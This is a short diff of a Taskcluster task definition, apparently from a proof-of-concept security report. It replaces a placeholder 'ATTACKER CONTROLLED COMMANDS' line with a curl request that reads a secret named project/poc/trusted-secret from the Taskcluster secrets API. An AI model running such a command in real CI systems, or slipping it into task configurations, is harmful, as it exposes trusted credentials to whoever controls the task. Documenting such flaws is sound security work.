@@ -22,4 +22,4 @@ tasks:
         command:
          - - /bin/bash
            - -c
-           - echo "ATTACKER CONTROLLED COMMANDS"
+           - curl http://taskcluster/api/secrets/v1/secret/project%2Fpoc%2Ftrusted-secret
